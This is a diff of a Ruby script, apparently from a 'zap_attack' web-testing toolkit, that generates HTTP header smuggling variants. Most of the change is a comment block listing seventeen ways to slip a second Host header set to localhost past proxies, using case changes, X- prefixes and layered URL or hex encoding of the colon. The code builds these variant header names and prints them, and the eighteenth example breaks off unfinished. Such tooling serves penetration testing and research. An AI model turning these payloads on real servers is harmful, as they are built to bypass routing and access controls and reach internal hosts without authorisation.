@@ -4,10 +4,112 @@
 # Use a variety of techniques to smuggle HTTP request headers through 
 #   intermediate web server parsing/processing/handling/etc.
 #
+# Usage: header-inject header-name nice-value mean-value
+#
+#
+# Examples:
+#
+# Original
+# ========
+# Host: www.target.host
+#
+# Generated 1
+# ===========
+# Host: www.target.host
+# Host: localhost
+#
+# Generated 2
+# ===========
+# Host: www.target.host
+# host: localhost
+#
+# Generated 3
+# ===========
+# Host: www.target.host
+# HOST: localhost
+#
+# Generated 4
+# ===========
+# Host: www.target.host
+# X-Host: localhost
+#
+# Generated 5
+# ===========
+# Host: www.target.host
+# HOST: localhost
+# host: localhost
+#
+# Generated 6
+# ===========
+# Host: www.target.host
+# Host:localhost
+#
+# Generated 7
+# ===========
+# Host: www.target.host
+# Host%3A localhost
+#
+# Generated 8
+# ===========
+# Host: www.target.host
+# Host\x3a localhost
+#
+# Generated 9
+# ===========
+# Host: www.target.host
+# Host%253A localhost
+#
+# Generated 10
+# ============
+# Host: www.target.host
+# Host%25253A localhost
+#
+# Generated 11
+# ============
+# Host: www.target.host
+# Host\x5C\x78\x3A localhost 
+#
+# Generated 12
+# ============
+# Host: www.target.host
+# HoSt: localhost
+#
+# Generated 13
+# ============
+# Host: www.target.host
+# x-host: localhost
+#
+# Generated 14
+# ============
+# Host: www.target.host
+# X-HOST: localhost
+#
+# Generated 15
+# ============
+# Host: www.target.host
+# X_HOST: localhost
+#
+# Generated 16
+# ============
+# Host: www.target.host
+# x_host: localhost
+#
+# Generated 17
+# ============
+# Host: www.target.host
+# X-X-Host: localhost
+#
+# Generated 18
+# ============
+# Host: www.target.host
+# 
 
+
+require 'ansi'
+require 'facets'
 require 'zap_attack'
 
-include ZapAttack, ZapAttack::API, ZapAttack::Data
+include ZapAttack::API
 
 headers = Params.new
 
@@ -19,17 +121,16 @@ names = []
 
 headers.each do |h|
   aname = h['name']
-  lname = aname.dup
-
-  lname.downcase!
+  lname = aname.downcase
 
   namez = names.select do |x| 
-    x.downcase!
+    alowr = x.downcase
     
-    x.eql?(lname) 
+    alowr.eql?(lname) 
   end
 
-  names.concat( [ aname ] ) if namez.size.zero?
+  names.concat( [ aname ] ) if namez.empty?
+  names.concat( [ h['name'] ] )
 end
 
 extra = []
@@ -37,9 +138,7 @@ extra = []
 names.each do |n|
   danam = n.dup
 
-  danam.downcase!
-
-  if danam.start_with?('x-')
+  if danam.start_with?('x-') or danam.start_with?('X-')
     extra << n[2 .. -1] 
   else
     extra << "X-#{n}"
@@ -56,7 +155,14 @@ names.each do |n|
   extra << danam
 end
 
-puts names
-puts extra
+names.sort!
+names.uniq!
+
+extra.sort!
+extra.uniq!
+
+hedrs = names + extra
+
+puts hedrs
 
 exit 0
